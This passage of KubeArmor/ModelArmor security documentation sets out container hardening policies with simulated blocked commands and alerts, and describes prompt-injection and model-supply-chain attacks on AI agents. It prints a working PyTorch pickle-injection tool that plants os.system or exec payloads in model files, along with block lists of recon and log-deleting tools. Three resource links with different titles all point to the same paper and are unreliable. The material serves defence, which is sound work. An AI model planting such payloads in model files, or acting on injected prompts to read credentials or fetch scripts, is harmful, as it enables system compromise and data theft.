  - MITRE_T1610_deploy_container
  - MITRE
  - NIST_800-53
  - NIST_800-53_AU-2
  - NIST_800-53_SI-4
  - NIST
```

**Simulation**

```sh
kubectl exec -it dvwa-web-566855bc5b-4j4vl -- bash
root@dvwa-web-566855bc5b-4j4vl:/var/www/html# kubectl
bash: /usr/bin/kubectl: Permission denied
root@dvwa-web-566855bc5b-4j4vl:/var/www/html#
```

**Expected Alert**

```
{
  "ATags": null,
  "Action": "Block",
  "ClusterName": "aditya",
  "ContainerID": "32015ebeea9e1f4d4e7dbf6608c010ef2b34c48f1af11a5c6f0ea2fd27c6ba6c",
  "ContainerImage": "docker.io/cytopia/dvwa:php-8.1@sha256:f7a9d03b1dfcec55757cc39ca2470bdec1618b11c4a51052bb4f5f5e7d78ca39",
  "ContainerName": "dvwa",
  "Data": "syscall=SYS_EXECVE",
  "Enforcer": "AppArmor",
  "HashID": "1167b21433f2a4e78a4c6875bb34232e6a2b3c8535e885bb4f9e336fd2801d92",
  "HostName": "aditya",
  "HostPID": 38035,
  "HostPPID": 37878,
  "Labels": "tier=frontend,app=dvwa-web",
  "Message": "",
  "NamespaceName": "default",
  "Operation": "Process",
  "Owner": {
    "Name": "dvwa-web",
    "Namespace": "default",
    "Ref": "Deployment"
  },
  "PID": 554,
  "PPID": 548,
  "PodName": "dvwa-web-566855bc5b-4j4vl",
  "PolicyName": "DefaultPosture",
  "ProcessName": "/usr/bin/kubectl",
  "Resource": "/usr/bin/kubectl",
  "Result": "Permission denied",
  "Severity": "",
  "Source": "/bin/bash",
  "Tags": "",
  "Timestamp": 1696326880,
  "Type": "MatchedPolicy",
  "UID": 0,
  "UpdatedTime": "2023-10-03T09:54:40.056501Z",
  "cluster_id": "3896",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "workload": "1"
}
```

### References

[MITRE ATT\&CK execution in k8s](https://cloud.redhat.com/blog/protecting-kubernetes-against-mitre-attck-execution)\
[Target Data Breach](https://www.idstrong.com/sentinel/that-one-time-target-lost-everything/)<br>

</details>

<details>

<summary>Discovery tools: Do not allow discovery/search of tools/configuration.</summary>

#### Description

Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system

#### Attack Scenario

Adversaries can potentially use information related to services, remote hosts, and local network infrastructure devices, including those that may be vulnerable to remote software exploitation to perform malicious attacks like exploiting open ports and injecting payloads to get remote shells. It's crucial to take proactive measures to prevent these attacks from occurring, such as implementing proper network segmentation and hardening network devices.\
**Attack Type** Reconnaissance, Brute force, Command Injection\
**Actual Attack** Microsoft exchange server attack 2021

#### Compliance

* CIS Distribution Independent Linuxv2.0
* Control-Id: 6.3

### Policy

#### Discovery tools

```yaml
Version: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: harden-dvwa-web-network-service-scanning
  namespace: default
spec:
  action: Block
  message: Network service has been scanned!
  process:
    matchPaths:
    - path: /usr/bin/netstat
    - path: /bin/netstat
    - path: /usr/sbin/ip
    - path: /usr/bin/ip
    - path: /sbin/ip
    - path: /bin/ip
    - path: /usr/sbin/iw
    - path: /sbin/iw
    - path: /usr/sbin/ethtool
    - path: /sbin/ethtool
    - path: /usr/sbin/ifconfig
    - path: /sbin/ifconfig
    - path: /usr/sbin/arp
    - path: /sbin/arp
    - path: /usr/sbin/iwconfig
    - path: /sbin/iwconfig
  selector:
    matchLabels:
      app: dvwa-web
      tier: frontend
  severity: 5
  tags:
  - MITRE
  - FGT1046
  - CIS
```

**Simulation**

```sh
kubectl exec -it dvwa-web-566855bc5b-xtgwq -- bash
root@dvwa-web-566855bc5b-xtgwq:/var/www/html# netstat
bash: /bin/netstat: Permission denied
root@dvwa-web-566855bc5b-xtgwq:/var/www/html# ifconfig
bash: /sbin/ifconfig: Permission denied
root@dvwa-web-566855bc5b-xtgwq:/var/www/html#
root@dvwa-web-566855bc5b-xtgwq:/var/www/html# arp
bash: /usr/sbin/arp: Permission denied
```

**Expected Alert**

```
{
  "Action": "Block",
  "ClusterName": "no-trust",
  "ContainerID": "e8ac2e227d293e76ab81a34945b68f72a2618ed3275ac64bb6a82f9cd2d014f1",
  "ContainerImage": "docker.io/cytopia/dvwa:php-8.1@sha256:f7a9d03b1dfcec55757cc39ca2470bdec1618b11c4a51052bb4f5f5e7d78ca39",
  "ContainerName": "dvwa",
  "Data": "syscall=SYS_EXECVE",
  "Enforcer": "AppArmor",
  "HostName": "aditya",
  "HostPID": 35592,
  "HostPPID": 35557,
  "Labels": "tier=frontend,app=dvwa-web",
  "Message": "Network service has been scanned!",
  "NamespaceName": "default",
  "Operation": "Process",
  "Owner": {
    "Name": "dvwa-web",
    "Namespace": "default",
    "Ref": "Deployment"
  },
  "PID": 989,
  "PPID": 983,
  "ParentProcessName": "/bin/bash",
  "PodName": "dvwa-web-566855bc5b-npjn8",
  "PolicyName": "harden-dvwa-web-network-service-scanning",
  "ProcessName": "/bin/netstat",
  "Resource": "/bin/netstat",
  "Result": "Permission denied",
  "Severity": "5",
  "Source": "/bin/bash",
  "Tags": "MITRE,FGT1046,CIS",
  "Timestamp": 1696501152,
  "Type": "MatchedPolicy",
  "UpdatedTime": "2023-10-05T10:19:12.809606Z",
  "cluster_id": "4225",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "tenant_id": "167",
  "workload": "1"
}
```

### References

[MITRE Network Service Discovery](https://attack.mitre.org/techniques/T1046/)<br>

</details>

<details>

<summary>Logs delete: Do not allow external tooling to delete logs/traces of critical components.</summary>

#### Description

Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.

#### Attack Scenario

It's important to note that removal of indicators related to intrusion activity may interfere with event collection, reporting, or other processes used to detect such activity. This can compromise the integrity of security solutions by causing notable events to go unreported. Additionally, this activity may impede forensic analysis and incident response, due to a lack of sufficient data to determine what occurred. It's crucial to ensure that all relevant indicators are properly monitored and reported to prevent such issues from occurring.\
**Attack Type** Integrity Threats, Data Manipulation **Actual Attack** NetWalker, Conti, DarkSide RaaS

#### Compliance

* CIS Distribution Independent Linuxv2.0
* Control-Id: 6.6
* Control-Id: 7.6.2
* Control-Id: 7.6.3
* NIST\_800-53\_CM-5

### Policy

#### Logs delete

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: harden-nginx-shell-history-mod
  namespace: default
spec:
  action: Block
  file:
    matchPaths:
    - fromSource:
      - path: /usr/bin/shred
      - path: /usr/bin/rm
      - path: /bin/mv
      - path: /bin/rm
      - path: /usr/bin/mv
      path: /root/*_history
    - fromSource:
      - path: /usr/bin/shred
      - path: /usr/bin/rm
      - path: /bin/rm
      - path: /bin/mv
      - path: /usr/bin/mv
      path: /home/*/*_history
  message: Alert! shell history modification or deletion detected and prevented
  process:
    matchPaths:
    - path: /usr/bin/shred
    - path: /usr/bin/rm
    - path: /bin/mv
    - path: /bin/rm
    - path: /usr/bin/mv
  selector:
    matchLabels:
      app: nginx
  severity: 5
  tags:
  - CIS
  - NIST_800-53
  - NIST_800-53_CM-5
  - NIST_800-53_AU-6(8)
  - MITRE_T1070_indicator_removal_on_host
  - MITRE
  - MITRE_T1036_masquerading
```

**Simulation**

```sh
kubectl exec -it nginx-77b4fdf86c-x7sdm -- bash
root@nginx-77b4fdf86c-x7sdm:/# rm ~/.bash_history
rm: cannot remove '/root/.bash_history': Permission denied
root@nginx-77b4fdf86c-x7sdm:/# rm ~/.bash_history
rm: cannot remove '/root/.bash_history': Permission denied
```

**Expected Alert**

```
{
  "Action": "Block",
  "ClusterName": "0-trust",
  "ContainerID": "20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3",
  "ContainerImage": "docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755",
  "ContainerName": "nginx",
  "Data": "syscall=SYS_UNLINKAT flags=",
  "Enforcer": "AppArmor",
  "HostName": "aditya",
  "HostPID": 43917,
  "HostPPID": 43266,
  "Labels": "app=nginx",
  "NamespaceName": "default",
  "Operation": "File",
  "Owner": {
    "Name": "nginx",
    "Namespace": "default",
    "Ref": "Deployment"
  },
  "PID": 392,
  "PPID": 379,
  "ParentProcessName": "/usr/bin/bash",
  "PodName": "nginx-77b4fdf86c-x7sdm",
  "PolicyName": "DefaultPosture",
  "ProcessName": "/usr/bin/rm",
  "Resource": "/root/.bash_history",
  "Result": "Permission denied",
  "Source": "/usr/bin/rm /root/.bash_history",
  "Timestamp": 1696577978,
  "Type": "MatchedPolicy",
  "UpdatedTime": "2023-10-06T07:39:38.182538Z",
  "cluster_id": "4291",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "tenant_id": "167",
  "workload": "1"
}
```

### References

[MITRE Indicator Removal](https://attack.mitre.org/techniques/T1070/)<br>

</details>

<details>

<summary>ICMP control: Do not allow scanning tools to use ICMP for scanning the network.</summary>

#### Description

The Internet Control Message Protocol (ICMP) allows Internet hosts to notify each other of errors and allows diagnostics and troubleshooting for system administrators. Because ICMP can also be used by a potential adversary to perform reconnaissance against a target network, and due to historical denial-of-service bugs in broken implementations of ICMP, some network administrators block all ICMP traffic as a network hardening measure

#### Attack Scenario

Adversaries may use scanning tools that utilize Internet Control Message Protocol (ICMP) to perform reconnaissance against a target network and identify potential loopholes. It's crucial to monitor network traffic and take proactive measures to prevent these attacks from occurring, such as implementing proper firewall rules and network segmentation. Additionally, it's important to stay up-to-date with the latest security patches to prevent known vulnerabilities from being exploited.\
**Attack Type** Network Flood, DoS(Denial of Service)\
**Actual Attack** Ping of Death(PoD)

#### Compliance

* ICMP Control

### Policy

#### ICMP Control

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: restrict-scanning-tools
  namespace: default
spec:
  severity: 4
  selector:
    matchLabels:
      app: nginx
  network:
    matchProtocols:
    - protocol: icmp
      fromSource:
      - path: /usr/bin/ping
    - protocol: udp
      fromSource:
      - path: /usr/bin/ping
  action: Allow
  message: Scanning tool has been detected
```

**Simulation**

```sh
kubectl exec -it nginx-77b4fdf86c-x7sdm -- bash
root@nginx-77b4fdf86c-x7sdm:/# hping3 www.google.com
Unable to resolve 'www.google.com'
root@nginx-77b4fdf86c-x7sdm:/# hping3 127.0.0.1
Warning: Unable to guess the output interface
[get_if_name] socket(AF_INET, SOCK_DGRAM, 0): Permission denied
[main] no such device
root@nginx-77b4fdf86c-x7sdm:/# ping google.com
PING google.com (216.58.200.206) 56(84) bytes of data.
64 bytes from nrt12s12-in-f206.1e100.net (216.58.200.206): icmp_seq=1 ttl=109 time=51.9 ms
64 bytes from nrt12s12-in-f206.1e100.net (216.58.200.206): icmp_seq=2 ttl=109 time=60.1 ms
^C
--- google.com ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 51.917/56.005/60.094/4.088 ms
```

**Expected Alert**

```
{
  "Action": "Block",
  "ClusterName": "0-trust",
  "ContainerID": "20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3",
  "ContainerImage": "docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755",
  "ContainerName": "nginx",
  "Data": "syscall=SYS_SOCKET",
  "Enforcer": "AppArmor",
  "HostName": "aditya",
  "HostPID": 86904,
  "HostPPID": 86860,
  "Labels": "app=nginx",
  "NamespaceName": "default",
  "Operation": "Network",
  "Owner": {
    "Name": "nginx",
    "Namespace": "default",
    "Ref": "Deployment"
  },
  "PID": 1064,
  "PPID": 1058,
  "ParentProcessName": "/usr/bin/bash",
  "PodName": "nginx-77b4fdf86c-x7sdm",
  "PolicyName": "DefaultPosture",
  "ProcessName": "/usr/sbin/hping3",
  "Resource": "domain=AF_INET type=SOCK_DGRAM|SOCK_NONBLOCK|SOCK_CLOEXEC protocol=0",
  "Result": "Permission denied",
  "Source": "/usr/sbin/hping3 www.google.com",
  "Timestamp": 1696593032,
  "Type": "MatchedPolicy",
  "UpdatedTime": "2023-10-06T11:50:32.098937Z",
  "cluster_id": "4291",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "tenant_id": "167",
  "workload": "1"
}
```

</details>

<details>

<summary>Restrict Capabilities: Do not allow capabilities that can be leveraged by the attacker.</summary>

#### Description

Containers run with a default set of capabilities as assigned by the Container Runtime. Capabilities are parts of the rights generally granted on a Linux system to the root user. In many cases applications running in containers do not require any capabilities to operate, so from the perspective of the principal of least privilege use of capabilities should be minimized.

#### Attack Scenario

Kubernetes by default connects all the containers running in the same node (even if they belong to different namespaces) down to Layer 2 (ethernet). Every pod running in the same node is going to be able to communicate with any other pod in the same node (independently of the namespace) at ethernet level (layer 2). This allows a malicious containers to perform an ARP spoofing attack to the containers on the same node and capture their traffic.\
**Attack Type** Reconnaissance, Spoofing\
**Actual Attack** Recon through P.A.S. Webshell, NBTscan

#### Compliance

* CIS Kubernetes
* Control Id: 5.2.8 - Minimize the admission of containers with the NET\_RAW capability
* Control Id: 5.2.9 - Minimize the admission of containers with capabilities assigned

### Policy

#### Restrict Capabilities

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: ksp-ubuntu-1-cap-net-raw-block
  namespace: multiubuntu
spec:
  severity: 1
  selector:
    matchLabels:
      container: ubuntu-1
  capabilities:
    matchCapabilities:
    - capability: net_raw
  action:
    Block
```

**Simulation**

```sh
root@ubuntu-1-deployment-f987bd4d6-xzcb8:/# tcpdump
tcpdump: eth0: You don't have permission to capture on that device
(socket: Operation not permitted)
root@ubuntu-1-deployment-f987bd4d6-xzcb8:/#    
```

**Expected Alert**

```
{
    "Action":"Block",
    "ClusterName":"k3sn0d3",
    "ContainerID":"aaf2118edcc20b3b04a0fae6164f957993bf3c047fd8cb33bc37ac7d0175e848",
    "ContainerImage":"docker.io/kubearmor/ubuntu-w-utils:0.1@sha256:b4693b003ed1fbf7f5ef2c8b9b3f96fd853c30e1b39549cf98bd772fbd99e260",
    "ContainerName":"ubuntu-1-container",
    "Data":"syscall=SYS_SOCKET",
    "Enforcer":"AppArmor",
    "HashID":"dd12f0f12a75b30d47c5815f93412f51b259b74ac0eccc9781b6843550f694a3",
    "HostName":"worker-node02",
    "HostPID":38077,
    "HostPPID":38065,
    "Labels":"container=ubuntu-1 group=group-1",
    "Message":"",
    "NamespaceName":"multiubuntu",
    "Operation":"Network",
    "Owner":{
        "Name":"ubuntu-1-deployment",
        "Namespace":"multiubuntu",
        "Ref":"Deployment"
    },
    "PID":124,
    "PPID":114,
    "PodName":"ubuntu-1-deployment-f987bd4d6-xzcb8",
    "PolicyName":"ksp-ubuntu-1-cap-net-raw-block",
    "ProcessName":"/usr/sbin/tcpdump",
    "Resource":"domain=AF_PACKET type=SOCK_RAW protocol=768",
    "Result":"Operation not permitted",
    "Severity":"1",
    "Source":"/usr/sbin/tcpdump",
    "Tags":"",
    "Timestamp":1705405378,
    "Type":"MatchedPolicy",
    "UID":0,
    "UpdatedTime":"2024-01-16T11:42:58.662928Z",
    "UpdatedTimeISO":"2024-01-16T11:42:58.662Z",
    "cluster_id":"16402",
    "component_name":"kubearmor",
    "instanceGroup":"0",
    "instanceID":"0",
    "workload":"1"
}
```

### References

[MITRE Network Service Discovery](https://attack.mitre.org/techniques/T1046/)<br>

</details>

# ModelArmor Overview

**ModelArmor** is a Zero Trust security solution purpose-built to protect AI/ML/LLM workloads from runtime threats. It safeguards against the unique risks of agentic AI systems and untrusted models by sandboxing deployments and enforcing granular runtime policies.

**ModelArmor** uses KubeArmor as a sandboxing engine to ensure that the untrusted models execution is constrained and within required checks. AI/ML Models are essentially processes and allowing untrusted models to execute in AI environments have significant risks such as possibility of cryptomining attacks leveraging GPUs, remote command injections, etc. KubeArmor's preemptive mitigation mechanism provides a suitable framework for constraining the execution environment of models.

ModelArmor can be used to enforce security policies on the model execution environment.

## Why ModelArmor?

ModelArmor enables secure deployment of **agentic AI applications** and **ML models**, addressing critical security gaps that traditional guardrails and static scanning cannot solve.

It is designed for:

* **Agentic AI workloads** using autonomous, tool-using agents.
* **ML pipelines** importing untrusted models from public repositories.
* Environments where **guardrails alone are not sufficient**.

ModelArmor protects the **entire AI lifecycle**, from development to deployment, using **sandboxing** and **policy enforcement** to neutralize malicious behavior at runtime.

## The Problem: Security Risks in Agentic AI

### 1. Arbitrary Code Execution

Agentic AI systems can **execute arbitrary system commands** due to their autonomy and access to tools.

* Prompt engineering can bypass LLM guardrails.
* Attackers can instruct agents to run harmful commands, download malware, or scan networks.

![](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-2918d2f3a9ab16a318f695b8640842e85634fee7%2Fdemo1.png?alt=media)

![](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-1f6a5a0a71a5f238d914a6a1d868ce2a5d80b8cc%2Fdemo2.png?alt=media)

### 2. Model Supply Chain Attacks

Malicious models uploaded to public repositories (e.g., Hugging Face) can contain embedded payloads.

* Loading such models allows **hidden code execution**, leading to system compromise and C\&C communication.

![Code Execution Cannot Be Governed Traditionally](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-4875f47d7ff4640683ce05065e94a2983cb78405%2Frisk1.png?alt=media)

### 3. Prompt Injection Attacks

Crafted prompts can manipulate the agent into performing unauthorized actions:

* Reading sensitive files (e.g., `/root/.aws/credentials`).
* Installing tools (`apk add nmap`) or scanning networks.
* Fetching and executing external scripts.

> Traditional container security cannot detect these because they exploit application behavior, not the container itself.

![Guardrails are not enough against sophisticated prompt engineering](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-034373818b9ccfd4423162acda106467290fd5c4%2Frisk2.png?alt=media)

## The Solution

![](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-1f68ab6f3df6e4d26e150db2e56a608f592255fc%2Fissuesfixed.png?alt=media)

### Sandboxing Agentic AI

ModelArmor **isolates agentic AI apps** and ML workloads at runtime, blocking unauthorized actions even if guardrails or code reviews are bypassed.

![Zero Trust Policy Enforcement](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-b8833b2d46705a54f0c36b824cb38113536d0b16%2Fuse3.png?alt=media)

### Zero Trust Policy Enforcement

Define **fine-grained security policies** to:

* **Restrict file system access** (e.g., block `/root/.aws/credentials`).
* **Control process execution** (allow only trusted binaries).
* **Limit network activity** (disable raw sockets, ICMP, or outbound traffic).

![](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-1f469b3c22871ae12996945af9d8634a9f5994d6%2Fuse4.png?alt=media)

### Automated Red Teaming

Simulate adversarial scenarios like malicious model imports and prompt injections to **identify vulnerabilities pre-deployment**.

### Protection Across the Stack

ModelArmor works across frameworks and environments:

* Supports any **language runtime** or **AI framework**.
* Requires no code changes to your application.
* Lightweight and **cost-efficient**, avoiding the overhead of MicroVMs or full isolation environments.

![Granular Policy Enforcement for Process, Network, Volumes and AI flows](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-1e4a0b98fbb97e6a7759c0a33bc5d0e7581d3822%2Fuse5.png?alt=media)

## TensorFlow Based Use Cases

### FGSM Adversarial Input Attack

An FGSM attack manipulates input data by adding imperceptible noise, creating adversarial examples that force the TensorFlow model to misclassify (e.g., predicting “5” for an image of “2”).

Traditional container security fails here because the model and container remain unchanged; the attack happens through crafted input.

**ModelArmor Protection:**

* Proactively simulates adversarial attacks using *Automated Red Teaming*.
* Secures model behavior with input validation and anomaly detection, akin to an *LLM Prompt Firewall* for ML workloads.
* Protects against sophisticated input-level manipulations.

![](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-af2209794482426decc0463693063aa4be821190%2Fuse2.png?alt=media)

[▶️ Watch FGSM Attack Video](https://drive.google.com/file/d/1EnmsIiR4G4bYmoxBIHTk1bDkW2XatM4N/preview)

### Keras Model Injection Attack

A deployed TensorFlow model in a Docker container is vulnerable to compromise via a malicious Keras Lambda layer. This attack involves:

* Installing Python inside the container or
* Copying malicious scripts (e.g., into `/tmp`) to execute unauthorized system commands.

**ModelArmor Protection:**

* Blocks unauthorized installations (e.g., Python) and filesystem modifications (e.g., writing to `/tmp`).
* Uses *Automated Red Teaming* to detect such vulnerabilities pre-deployment.
* Isolates workloads (like TensorFlow) with *Sandboxing Agentic AI* to prevent code injection.

![Keras Model Injection Attack Mitigation](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-87d573fb1b240cc7155b1fac75bb4098f9c40636%2Fuse1.png?alt=media)

[▶️ Watch Keras Inject Video](https://drive.google.com/file/d/1olGBz3WUoJqmcAVdRY7uImKTHggRX6nK/preview)

***

## Securing NVIDIA NIM

![](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-d47e50ae66250fc5ba635359b53f1281a8fc6363%2Fnvidia1.png?alt=media)

![](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-9d8b0ace26182b93b0712df9ae1160b481ef9b5a%2Fnvidia2.png?alt=media)

📄 [View PDF: Securing\_NVIDIA\_NIM.pdf](https://drive.google.com/file/d/16DjsSyOAWr1S4EwSTBSx63SLDHPFnSAh/preview)

# Pickle Code Injection PoC

The **Pickle Code Injection Proof of Concept (PoC)** demonstrates the security vulnerabilities in Python's `pickle` module, which can be exploited to execute arbitrary code during deserialization. This method is inherently insecure because it allows execution of arbitrary functions without restrictions or security checks.

## Core Code Overview

**Custom Pickle Injector:**

```python
import os, argparse, pickle, struct, shutil
from pathlib import Path
import torch

class PickleInject:
    def __init__(self, inj_objs, first=True):
        self.inj_objs = inj_objs
        self.first = first

    class _Pickler(pickle._Pickler):
        def __init__(self, file, protocol, inj_objs, first=True):
            super().__init__(file, protocol)
            self.inj_objs = inj_objs
            self.first = first

        def dump(self, obj):
            if self.proto >= 2:
                self.write(pickle.PROTO + struct.pack("<B", self.proto))
            if self.first:
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)
            self.save(obj)
            if not self.first:
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)
            self.write(pickle.STOP)

    def Pickler(self, file, protocol):
        return self._Pickler(file, protocol, self.inj_objs)

    class _PickleInject:
        def __init__(self, args, command=None):
            self.command = command
            self.args = args

        def __reduce__(self):
            return self.command, (self.args,)

    class System(_PickleInject):
        def __init__(self, args):
            super().__init__(args, command=os.system)

    class Exec(_PickleInject):
        def __init__(self, args):
            super().__init__(args, command=exec)

    class Eval(_PickleInject):
        def __init__(self, args):
            super().__init__(args, command=eval)

    class RunPy(_PickleInject):
        def __init__(self, args):
            import runpy
            super().__init__(args, command=runpy._run_code)
            def __reduce__(self):
                return self.command, (self.args, {})

# Parse Arguments
parser = argparse.ArgumentParser(description="PyTorch Pickle Inject")
parser.add_argument("model", type=Path)
parser.add_argument("command", choices=["system", "exec", "eval", "runpy"])
parser.add_argument("args")
args = parser.parse_args()

# Payload construction
command_args = args.args
if os.path.isfile(command_args):
    with open(command_args, "r") as in_file:
        command_args = in_file.read()

if args.command == "system":
    payload = PickleInject.System(command_args)
elif args.command == "exec":
    payload = PickleInject.Exec(command_args)
elif args.command == "eval":
    payload = PickleInject.Eval(command_args)
elif args.command == "runpy":
    payload = PickleInject.RunPy(command_args)

# Save the injected payload
backup_path = f"{args.model}.bak"
shutil.copyfile(args.model, backup_path)
torch.save(torch.load(args.model), f=args.model, pickle_module=PickleInject([payload]))
```

## Example Exploits

1. **Print Injection:**

   ```bash
   python torch_pickle_inject.py model.pth exec "print('hello')"
   ```

2. **Install Packages:**

   ```bash
   python torch_pickle_inject.py model.pth system "pip install numpy"
   ```

3. **Adversarial Command Execution:** Upon loading the tampered model:

   ```bash
   python main.py
   ```

   Output:

   * Installs the package or executes the payload.
   * Alters model behavior: changes predictions, losses, etc.

## Attacker Use Cases

1. **Spreading Malware:** The injected code can download and install malware on the target machine, which can then be used to infect other systems in the network or create a botnet.
2. **Backdoor Installation:** An attacker can use pickle injection to install a backdoor that allows persistent access to the system, even if the original vulnerability is patched.
3. **Data Exfiltration:** An attacker can use pickle injection to read sensitive files or data from the system and send it to a remote server. This can include configuration files, database credentials, or any other sensitive information stored on the machine.

## Key Risks

The `pickle` module is inherently insecure for handling untrusted input due to its ability to execute arbitrary code.

Ref: <https://hiddenlayer.com/research/weaponizing-machine-learning-models-with-ransomware/#Pickle-Code-Injection-POC>

***

# Adversarial Attacks on Deep Learning Models

Adversarial attacks exploit vulnerabilities in AI systems by subtly altering input data to mislead the model into incorrect predictions or decisions. These perturbations are often imperceptible to humans but can significantly degrade the system's performance.

## **Types of Adversarial Attacks**

1. **By Model Access:**
   * **White-box Attacks**: Complete knowledge of the model, including architecture and training data.
   * **Black-box Attacks**: No information about the model; the attacker probes responses to craft inputs.
2. **By Target Objective:**
   * **Non-targeted Attacks**: Push input to any incorrect class.
   * **Targeted Attacks**: Force input into a specific class.

## **Attack Phases**

1. **Training Phase Attacks:**
   * **Data Poisoning**: Injects malicious data into the training set, altering model behavior.
   * **Backdoor Attacks**: Embeds triggers in training data that activate specific responses during inference.
2. **Inference Phase Attacks:**
   * **Model Evasion**: Gradually perturbs input to skew predictions (e.g., targeted misclassification).
   * **Membership Inference**: Exploits model outputs to infer sensitive training data (e.g., credit card numbers).

## **Observations on Model Robustness**

Highly accurate models often exhibit reduced robustness against adversarial perturbations, creating a tradeoff between accuracy and security. For instance, Chen et al. found that better-performing models tend to be more sensitive to adversarial inputs.

![Adversarial Model Performance](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-b7e7344cb259a081b5e442f86e219df2c517801c%2F1.png?alt=media)

## **Defense Strategies**

1. **Pre-analysis:** Test models for prompt injection vulnerabilities using techniques like fuzzing.
2. Input Sanitation:
   * **Validation**: Enforce strict input rules (e.g., character and data type checks).
   * **Filtering**: Strip malicious scripts or fragments.
   * **Encoding**: Convert special characters to safe representations.
3. Secure Practices for Model Deployment:
   * Restrict model permissions.
   * Regularly update libraries to patch vulnerabilities.
   * Detect injection attempts with specialized tooling.

![Defense Strategies](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-da2d6807d2babd59cd2ce8aacaa79bcf06a07b39%2F2.png?alt=media)

## **Case Study: Pickle Injection Vulnerability**

Python's `pickle` module allows serialization and deserialization but lacks security checks. Attackers can exploit this to execute arbitrary code using crafted payloads. The module’s inherent insecurity makes it risky to use with untrusted inputs.

**Mitigation:**

* Avoid using `pickle` with untrusted sources.
* Use secure serialization libraries like `json` or `protobuf`.

## **Relevant Resources**

* [Adversarial Attacks on Deep Learning Models](https://arxiv.org/pdf/2308.14367)
* [How to Protect ML Models Against Adversarial Attacks](https://arxiv.org/pdf/2308.14367)
* [Weaponizing ML Models with Ransomware](https://arxiv.org/pdf/2308.14367)

***

# KubeArmor Events

## Supported formats

1. Native Json format (this document)
2. [KubeArmor Open Telemetry format](https://github.com/kubearmor/otel-adapter/blob/main/example/tutorials/tutorial.md)
3. KubeArmor CEF Format (coming soon...)

## Container Telemetry

### Container Telemetry Fields format

| Log field         | Description                                                         | Example                                                                           |
| ----------------- | ------------------------------------------------------------------- | --------------------------------------------------------------------------------- |
| ClusterName       | gives information about the cluster for which the log was generated | default                                                                           |
| Operation         | gives details about what type of operation happened in the pod      | File/Process/ Network                                                             |
| ContainerID       | information about the container ID from where log was generated     | 7aca8d52d35ab7872df6a454ca32339386be                                              |
| ContainerImage    | shows the image that was used to spin up the container              | docker.io/accuknox/knoxautopolicy:v0.9\@sha256:bb83b5c6d41e0d0aa3b5d6621188c284ea |
| ContainerName     | specifies the Container name where the log got generated            | discovery-engine                                                                  |
| Data              | shows the system call that was invoked for this operation           | syscall=SYS\_OPENAT fd=-100 flags=O\_RDWR\|O\_CREAT\|O\_NOFOLLOW\|O\_CLOEXEC      |
| HostName          | shows the node name where the log got generated                     | aks-agentpool-16128849-vmss000001                                                 |
| HostPID           | gives the host Process ID                                           | 967872                                                                            |
| HostPPID          | list the details of host Parent Process ID                          | 967496                                                                            |
